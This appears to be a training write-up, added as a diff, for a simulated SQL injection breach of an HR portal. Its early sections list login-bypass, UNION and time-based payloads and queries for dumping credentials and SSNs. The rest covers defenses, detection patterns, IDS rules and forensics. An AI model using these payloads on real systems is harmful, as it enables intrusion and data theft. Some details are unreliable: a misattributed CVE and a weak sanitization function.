@@ -1,0 +1,225 @@
+# SQL Injection Payloads - Bruce Industries Simulation
+# ⚠️  FOR EDUCATIONAL PURPOSES ONLY - USE ONLY IN AUTHORIZED TESTING ENVIRONMENTS
+
+## Authentication Bypass Payloads
+
+### Basic OR-Based Bypass
+```
+username: ' OR '1'='1
+password: ' OR '1'='1
+```
+
+### Comment-Based Bypass
+```
+username: admin'--
+password: anything
+
+username: admin'#
+password: anything
+```
+
+### Union-Based Injection (Data Extraction)
+```
+username: ' UNION SELECT NULL, username, password FROM users--
+password: anything
+```
+
+### Time-Based Blind SQLi (Testing)
+```
+username: admin' AND SLEEP(5)--
+password: anything
+```
+
+## Exploitation Timeline (From PCAP Analysis)
+
+### Initial Probe (Packet #144)
+```http
+POST /employee_pro/login.php HTTP/1.1
+Host: 10.200.0.91
+Content-Type: application/x-www-form-urlencoded
+
+username=' OR '1'='1&password=' OR '1'='1
+```
+
+**Result**: 
+- HTTP 200 OK
+- Authentication bypassed
+- Gained access to HR portal dashboard
+
+### Database Enumeration
+```sql
+-- Enumerate database version
+' UNION SELECT @@version,NULL--
+
+-- List all tables
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+-- Extract user credentials
+' UNION SELECT username,password FROM users--
+
+-- Dump sensitive employee data
+' UNION SELECT employee_id,ssn FROM hr_employees--
+```
+
+## Defense Mechanisms (Recommended)
+
+### 1. Prepared Statements (PHP)
+```php
+// VULNERABLE CODE (DO NOT USE)
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+$result = mysqli_query($conn, $query);
+
+// SECURE CODE (USE THIS)
+$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
+$stmt->bind_param("ss", $username, $password);
+$stmt->execute();
+$result = $stmt->get_result();
+```
+
+### 2. Input Validation
+```php
+function sanitize_input($data) {
+    $data = trim($data);
+    $data = stripslashes($data);
+    $data = htmlspecialchars($data);
+    return $data;
+}
+
+// Validate username (alphanumeric only)
+if (!preg_match("/^[a-zA-Z0-9]*$/", $username)) {
+    die("Invalid username format");
+}
+```
+
+### 3. Web Application Firewall (WAF) Rules
+```nginx
+# ModSecurity rules for SQL injection detection
+SecRule ARGS "@detectSQLi" \
+    "id:1001,\
+    phase:2,\
+    t:none,t:urlDecodeUni,t:lowercase,\
+    msg:'SQL Injection Attack',\
+    severity:2,\
+    deny,\
+    status:403"
+```
+
+### 4. Database Permissions
+```sql
+-- Principle of least privilege
+-- Web application should NOT have:
+DROP USER 'webapp_user'@'localhost';
+CREATE USER 'webapp_user'@'localhost' IDENTIFIED BY 'strong_password';
+
+-- Only grant necessary permissions
+GRANT SELECT, INSERT, UPDATE ON hr_portal.* TO 'webapp_user'@'localhost';
+
+-- NO DELETE, DROP, CREATE, ALTER permissions
+REVOKE ALL PRIVILEGES ON hr_portal.* FROM 'webapp_user'@'localhost';
+GRANT SELECT, INSERT, UPDATE ON hr_portal.users TO 'webapp_user'@'localhost';
+```
+
+## Detection Indicators
+
+### Log Entries to Monitor
+```bash
+# Apache access logs
+grep -E "(UNION|SELECT|INSERT|UPDATE|DELETE|DROP|';|--)" /var/log/apache2/access.log
+
+# Look for SQL keywords in POST data
+grep -E "POST.*('|%27|UNION|SELECT)" /var/log/apache2/access.log
+```
+
+### Network IDS Rules (Snort/Suricata)
+```
+alert tcp any any -> any 80 (msg:"SQL Injection - UNION SELECT"; flow:to_server,established; content:"POST"; http_method; content:"UNION"; nocase; http_client_body; sid:1000001; rev:1;)
+
+alert tcp any any -> any 80 (msg:"SQL Injection - OR 1=1"; flow:to_server,established; content:"POST"; http_method; content:"OR"; nocase; content:"1=1"; nocase; distance:0; http_client_body; sid:1000002; rev:1;)
+
+alert tcp any any -> any 80 (msg:"SQL Injection - Comment-based"; flow:to_server,established; content:"POST"; http_method; pcre:"/--|\#|\/\*/"; http_client_body; sid:1000003; rev:1;)
+```
+
+### SIEM Correlation Rules
+```yaml
+- name: Multiple SQL Injection Attempts
+  description: Alert when multiple SQL injection signatures detected from single IP
+  conditions:
+    - event_type: web_attack
+    - attack_type: sql_injection
+    - time_window: 60 seconds
+    - threshold: 3 attempts
+  action: alert_security_team
+
+- name: Successful Authentication After SQLi
+  description: Authentication success following SQL injection attempt
+  conditions:
+    - sequence:
+        1. sql_injection_attempt
+        2. authentication_success
+    - time_window: 120 seconds
+  action: block_ip_and_alert
+```
+
+## Forensic Analysis
+
+### Evidence Found in Simulation
+```
+Wireshark Packet #144:
+  Source: 10.200.0.129 (Attacker)
+  Destination: 10.200.0.91 (HR Server)
+  Protocol: HTTP POST
+  Endpoint: /employee_pro/login.php
+  
+HTTP Request:
+  username=' OR '1'='1
+  password=' OR '1'='1
+  
+HTTP Response:
+  Status: 200 OK
+  Set-Cookie: PHPSESSID=d9nqrudet7qe20njvanp8agqoc
+  
+Result: SUCCESSFUL BYPASS
+```
+
+### Timeline Correlation
+```
+[2025-04-15 14:23:45] SQL Injection attempt detected (IDS alert)
+[2025-04-15 14:23:47] Authentication successful for 'admin' (unusual login)
+[2025-04-15 14:24:12] Multiple database queries from web app (suspicious)
+[2025-04-15 14:24:38] File upload request to /employee_pro/upload.php
+```
+
+## Vulnerability Details
+
+**CVE Reference**: Similar to CVE-2019-11510 (SQL Injection in web portal)
+
+**CVSS Score**: 9.8 (Critical)
+- Attack Vector: Network
+- Attack Complexity: Low
+- Privileges Required: None
+- User Interaction: None
+- Confidentiality Impact: High
+- Integrity Impact: High
+- Availability Impact: High
+
+**OWASP Category**: A03:2021 – Injection
+
+## Remediation Checklist
+
+- [ ] Replace all dynamic SQL queries with prepared statements
+- [ ] Implement input validation and sanitization
+- [ ] Deploy Web Application Firewall (WAF)
+- [ ] Enable query logging for forensic analysis
+- [ ] Implement rate limiting on login endpoints
+- [ ] Add CAPTCHA to prevent automated attacks
+- [ ] Conduct regular penetration testing
+- [ ] Train developers on secure coding practices
+
+---
+
+**Note**: This file documents the SQL injection vulnerability exploited during the Bruce Industries simulation. The payloads and techniques shown here should ONLY be used in authorized security testing environments. Unauthorized access to computer systems is illegal.
+
+**References**:
+- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
+- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
+- CWE-89: SQL Injection: https://cwe.mitre.org/data/definitions/89.html
